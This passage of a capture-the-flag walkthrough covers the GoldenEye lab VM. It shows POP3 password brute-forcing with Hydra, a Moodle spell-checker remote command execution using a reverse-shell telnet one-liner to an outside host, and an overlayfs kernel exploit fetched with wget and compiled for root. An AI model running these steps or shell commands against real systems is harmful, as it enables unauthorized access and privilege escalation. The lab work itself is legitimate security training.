- But I'm actually thinking, that it's not important for us to send a mail or not, but it's actually just a lead for us to find the pop3(s) port, and bruteforcing it to get credential so we can get their mails for more clue:
```bash
└╼cn$ nc -v 192.168.20.7 55007
Connection to 192.168.20.7 port 55007 [tcp/*] succeeded!
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS secret1!
+OK Logged in.
help
-ERR Unknown command: HELP
mail
-ERR Unknown command: MAIL
list
+OK 4 messages:
1 544
2 373
3 921
4 548
.
1
-ERR Unknown command: 1
retr 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id D9E47454B1
	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
retr 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id C3F2B454B1
	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
retr 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

.
retr 4
+OK 548 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris@ubuntu
Delivered-To: boris@ubuntu
Received: from channingnicos-macbook-pro.local (unknown [192.168.20.1])
	by ubuntu (Postfix) with ESMTP id 7EB8B42358
	for <boris@ubuntu>; Fri,  7 May 2021 22:38:27 -0700 (PDT)
Date: Sat, 08 May 2021 13:38:27 +0800
To: boris@ubuntu
From: natalya@ubuntu
Subject: test Sat, 08 May 2021 13:38:27 +0800
Message-Id: <20210508133827.002061@channingnicos-macbook-pro.local>
X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/

I want the training


.
USER natalya
-ERR Unknown command: USER
quit
+OK Logging out.

┌[ChanningNicos-MacBook-Pro]─[13:40-08/05]─[/tmp]
└╼cn$ nc -v 192.168.20.7 55007
Connection to 192.168.20.7 port 55007 [tcp/*] succeeded!
+OK GoldenEye POP3 Electronic-Mail System
USER natalya
+OK
PASS bird
+OK Logged in.
list
+OK 2 messages:
1 631
2 1048
.
retr 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id D5EDA454B1
	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
retr 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 17C96454B1
	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.


.
quit
+OK Logging out.
```

- Wow, big story, boris is a mole, janus is bad guy, xenia is vote by boris, she is a mole as well. There's one time code for boris from the Syndicate.
- GNO address: severnaya-station.com/gnocertdir, need to add hostname to hosts file.
- Username: xenia
- Password: RCP90rulez!
- Final access code for GOLDENEYE is in a hidden file within the root directory
# GNO system
## GNO Web service reconn

![](Pasted%20image%2020210508135232.png)

- This system is from moodle, so I searchsploit of it.
```bash
└╼cn$ searchsploit moodle
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
Mambo Component Mam-Moodle alpha - Remote File Inclusion           | php/webapps/2064.txt
Moodle - Remote Command Execution (Metasploit)                     | linux/remote/29324.rb
Moodle 1.1/1.2 - Cross-Site Scripting                              | php/webapps/24071.txt
Moodle 1.5.2 - 'moodledata' Remote Session Disclosure              | php/webapps/3508.txt
Moodle 1.5/1.6 - '/mod/forum/discuss.php?navtail' Cross-Site Scrip | php/webapps/29284.txt
Moodle 1.6dev - SQL Injection / Command Execution                  | php/webapps/1312.php
Moodle 1.7.1 - 'index.php' Cross-Site Scripting                    | php/webapps/30261.txt
Moodle 1.8.3 - 'install.php' Cross-Site Scripting                  | php/webapps/31020.txt
Moodle 1.8.4 - Remote Code Execution                               | php/webapps/6356.php
Moodle 1.9.3 - Remote Code Execution                               | php/webapps/7437.txt
Moodle 1.x - 'post.php' Cross-Site Scripting                       | php/webapps/24356.txt
Moodle 2.0.1 - 'PHPCOVERAGE_HOME' Cross-Site Scripting             | php/webapps/35297.txt
Moodle 2.3.8/2.4.5 - Multiple Vulnerabilities                      | php/webapps/28174.txt
Moodle 2.5.9/2.6.8/2.7.5/2.8.3 - Block Title Handler Cross-Site Sc | php/webapps/36418.txt
Moodle 2.7 - Persistent Cross-Site Scripting                       | php/webapps/34169.txt
Moodle 2.x/3.x - SQL Injection                                     | php/webapps/41828.php
Moodle 3.10.3 - 'label' Persistent Cross Site Scripting            | php/webapps/49714.txt
Moodle 3.10.3 - 'url' Persistent Cross Site Scripting              | php/webapps/49797.txt
Moodle 3.4.1 - Remote Code Execution                               | php/webapps/46551.php
Moodle 3.6.3 - 'Install Plugin' Remote Command Execution (Metasplo | php/remote/46775.rb
Moodle 3.8 - Unrestricted File Upload                              | php/webapps/49114.txt
Moodle < 1.6.9/1.7.7/1.8.9/1.9.5 - File Disclosure                 | php/webapps/8297.txt
Moodle Blog 1.18.2.2/1.6.2 Module - SQL Injection                  | php/webapps/28770.txt
Moodle Filepicker 3.5.2 - Server Side Request Forgery              | php/webapps/47177.txt
Moodle Help Script 1.x - Cross-Site Scripting                      | php/webapps/24279.txt
Moodle Jmol Filter 6.1 - Directory Traversal / Cross-Site Scriptin | php/webapps/46881.txt
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- There's lots of it, need to confirm the version.
- After login to GNO system, there's a message from message box.

![](Pasted%20image%2020210508135546.png)

- Now there comes with another user: Dr Doak., his email username is `doak`, so we should crack his password, and get more mails.
```bash
└╼cn$ hydra -l doak -P /opt/seclists/Passwords/fasttrack.txt pop3://192.168.20.7:55007
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-08 16:47:02
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://192.168.20.7:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
[55007][pop3] host: 192.168.20.7   login: doak   password: goat
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-08 16:49:21
```
- So we shall get more mails with username `doak`, password `goat`.
```bash
└╼cn$ nc -v 192.168.20.7 55007                                                                                                                                                                        130 ⨯
Connection to 192.168.20.7 port 55007 [tcp/*] succeeded!
+OK GoldenEye POP3 Electronic-Mail System
USER doak
+OK
PASS goat
+OK Logged in.
list
+OK 1 messages:
1 606
.
retr 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 97DC24549D
	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

.
quit
+OK Logging out.
```

- When clicking Tags, we got another two users: admin and boris

![](Pasted%20image%2020210508135906.png)

![](Pasted%20image%2020210508135944.png)

- Xenia user profile

![](Pasted%20image%2020210508140035.png)

- A file uploader

![](Pasted%20image%2020210508140129.png)

- Tried to upload a fake png file, it's ok with the upload function, but can't find the valid path to access it. It will always lead to a file download.

- So nothing we've got from xenia anyway, let's try username `dr_doak` with password `4England!`.
- After login, the very first thing catch our eyes is a secret file.

![](Pasted%20image%2020210508165306.png)

![](Pasted%20image%2020210508165355.png)

```bash
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

![](Pasted%20image%2020210508165616.png)

- We shall download and exam it.
```bash
└╼cn$ exiftool for-007.jpg
ExifTool Version Number         : 12.16
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 KiB
File Modification Date/Time     : 2018:04:25 08:40:02+08:00
File Access Date/Time           : 2021:05:08 16:56:58+08:00
File Inode Change Date/Time     : 2021:05:08 16:56:58+08:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066

└╼cn$ echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d
xWinter1995x!
````

- So this is GNO system's admin credential! We shall log back in as admin now.

![](Pasted%20image%2020210508165944.png)

![](Pasted%20image%2020210508170021.png)

- Boris, sir? Are you sure about that?

![](Pasted%20image%2020210508170156.png)

- Is this so obvious? A telnet command?

![](Pasted%20image%2020210508174103.png)

`sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'`

- Alright, here's it. Have to tell the system to use aspell or pspellshell.

![](Pasted%20image%2020210508175040.png)

- I tried on aspell, but not work, then I found a metasploit exploit, ###### 29324
https://www.exploit-db.com/exploits/29324
- By checking the ruby code, I figured it out, first go to Server -> System Path to put reverse shell command into aspell text box:

![](Pasted%20image%2020210508181721.png)

- Then go change the TinyMCE editor setting from Plugins -> Text Editors -> TinyMCE HTML Editor, Spell Engine to pspellshell.

![](Pasted%20image%2020210508181828.png)

- Setup a listener, and then go to new blog entry and click the spellcheck button, that's it.

![](Pasted%20image%2020210508181921.png)

```bash
└╼cn$ bash

The default interactive shell is now zsh.
To update your account to use zsh, please run `chsh -s /bin/zsh`.
For more details, please visit https://support.apple.com/kb/HT208050.
bash-3.2$ ncat -lvnp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.20.7.
Ncat: Connection from 192.168.20.7:52848.
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ ^Z
[1]+  Stopped                 ncat -lvnp 4444
bash-3.2$ stty raw -echo
bash-3.2$ ncat -lvnp 4444

<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ export TERM=xterm
ns/spellchecker$ var/www/html/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugin
ns/spellchecker$ lsr/www/html/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugin
changelog.txt  config.php  editor_plugin.js	 img	   rpc.php
classes        css	   editor_plugin_src.js  includes
ns/spellchecker$ cd /www/html/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugin
```
# Privesc
## Reconn
- My first thought after I got shell is that seems like we did mention a hidden file that exist in the root directory. But seems like not?
```bash
www-data@ubuntu:/$ ls -al
total 84
drwxr-xr-x  22 root root  4096 Apr 24  2018 .
drwxr-xr-x  22 root root  4096 Apr 24  2018 ..
drwxr-xr-x   2 root root  4096 Apr 23  2018 bin
drwxr-xr-x   3 root root  4096 Apr 23  2018 boot
drwxr-xr-x  15 root root  4040 May  8 03:24 dev
drwxr-xr-x  91 root root  4096 May  8 03:24 etc
drwxr-xr-x   5 root root  4096 Apr 29  2018 home
lrwxrwxrwx   1 root root    33 Apr 23  2018 initrd.img -> boot/initrd.img-3.13.0-32-generic
drwxr-xr-x  21 root root  4096 Apr 23  2018 lib
drwxr-xr-x   2 root root  4096 Apr 28  2018 lib64
drwx------   2 root root 16384 Apr 23  2018 lost+found
drwxr-xr-x   4 root root  4096 Apr 23  2018 media
drwxr-xr-x   2 root root  4096 Apr 10  2014 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2018 opt
dr-xr-xr-x 161 root root     0 May  8 03:23 proc
drwx------   3 root root  4096 Apr 29  2018 root
drwxr-xr-x  18 root root   580 May  8 03:24 run
drwxr-xr-x   2 root root  4096 Apr 23  2018 sbin
drwxr-xr-x   2 root root  4096 Jul 22  2014 srv
dr-xr-xr-x  13 root root     0 May  8 03:24 sys
drwxrwxrwt   5 root root  4096 May  8 03:26 tmp
drwxr-xr-x  10 root root  4096 Apr 23  2018 usr
drwxr-xr-x  12 root root  4096 Apr 23  2018 var
lrwxrwxrwx   1 root root    30 Apr 23  2018 vmlinuz -> boot/vmlinuz-3.13.0-32-generic
````
- Or maybe the root directory is actually meaning that user root's directory.....
- All users are nologin.......That's why everytime I try to do su, I got this error if the password is correct: `This account is currently not available.`, but if I type wrong password, I would get this message: `su: Authentication failure`
```bash
www-data@ubuntu:/dev/shm$ grep -e '100.' /etc/passwd
libuuid:x:100:101::/var/lib/libuuid:
boris:x:1000:1000:boris,,,:/home/boris:/usr/sbin/nologin
natalya:x:1002:1002:,,,:/home/natalya:/usr/sbin/nologin
doak:x:1001:1001:,,,:/home/doak:/usr/sbin/nologin
````
- So if we consider this as a verification method, we will get below credential pair:
- User: `natalya`; password: `bird`
- User: `doak`; password: `goat`
- User: `boris`; password: `secret1!`
```bash
www-data@ubuntu:/$ su doak
Password: 'test'
su: Authentication failure
www-data@ubuntu:/$ su doak
Password: 'goat'
This account is currently not available.
www-data@ubuntu:/$ su natalya
Password: 'test'
su: Authentication failure
www-data@ubuntu:/$ su natalya
Password: 'bird'
This account is currently not available.
www-data@ubuntu:/$ su boris
Password: 'test'
su: Authentication failure
www-data@ubuntu:/$ su boris
Password: 'secret1!'
This account is currently not available.
````

## linpeas.sh
- 3.13.0-32-generic
	- no gcc exist on target system. But there's cc exist.
- tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
```bash
www-data@ubuntu:/dev/shm$ nc -v 127.0.0.1 5432
Connection to 127.0.0.1 5432 port [tcp/postgresql] succeeded!
^C
```

- Unfortunately there's not much information from linpeas........
- Have to find way for every user's reverse shell?
- The only two bash user I can find is root and the postgres sql, which is on port 5432.
```bash
www-data@ubuntu:/etc/ssh$ grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
postgres:x:106:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```
- Nope, this service is run by user postgresql....
- So far the only way is the kernel exploit. Since we don't have gcc, but we do have cc, we still are able to compile this ofs.c source code, but after execution, there's error prompt says gcc missing, by reviewing the code we found that it will use gcc to compile another file when executing, so we modify the code to change gcc to cc, and save, compile again. Job done.
```bash
www-data@ubuntu:/tmp$ wget http://192.168.20.1:8000/ofs.c
--2021-05-08 19:33:52--  http://192.168.20.1:8000/ofs.c
Connecting to 192.168.20.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3861 (3.8K) [text/x-c]
Saving to: 'ofs.c'

 0% [                                                                                                                                                                   ] 0           --.-K/s             100%[==================================================================================================================================================================>] 3,861       --.-K/s   in 0s

2021-05-08 19:33:52 (719 MB/s) - 'ofs.c' saved [3861/3861]

www-data@ubuntu:/tmp$ cc ofs.c -o ofs
ofs.c:61:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
ofs.c:73:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-functi
  GNU nano 2.2.6                                                         File: ofs.c                                                                                                                      #include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>

#include <stdio.h>
#include <stdlib.h>
on-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
ofs.c:78:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
ofs.c:84:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
ofs.c:94:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
www-data@ubuntu:/tmp$ ls
ofs  ofs.c  tinyspellTbKO3J  vmware-root
www-data@ubuntu:/tmp$ ls -al
total 44
drwxrwxrwt  5 root     root      4096 May  8 19:34 .
drwxr-xr-x 22 root     root      4096 Apr 24  2018 ..
drwxrwxrwt  2 root     root      4096 May  8 03:24 .ICE-unix
drwxrwxrwt  2 root     root      4096 May  8 03:24 .X11-unix
-rwxrwxrwx  1 www-data www-data 13771 May  8 19:34 ofs
-rw-rw-rw-  1 www-data www-data  3861 May  8 04:02 ofs.c
-rw-------  1 www-data www-data     4 May  8 03:26 tinyspellTbKO3J
drwx------  2 root     root      4096 May  8 03:24 vmware-root
www-data@ubuntu:/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 1: gcc: not found
couldn't create dynamic library
www-data@ubuntu:/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 1: gcc: not found
couldn't create dynamic library
www-data@ubuntu:/tmp$ rm -f ofs
www-data@ubuntu:/tmp$ nano ofs.c
www-data@ubuntu:/tmp$ grep gcc ofs.c
www-data@ubuntu:/tmp$ cc ofs.c -o ofs
ofs.c:61:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
ofs.c:73:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
ofs.c:78:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
ofs.c:84:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
ofs.c:94:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
www-data@ubuntu:/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
# ls -al
total 44
drwx------  3 root root 4096 Apr 29  2018 .
drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 28  2018 .cache
-rw-------  1 root root  144 Apr 29  2018 .flag.txt
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1024 Apr 23  2018 .rnd
-rw-------  1 root root 8296 Apr 29  2018 .viminfo
# cat .flag.txt
Alec told me to place the codes here:

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/

```
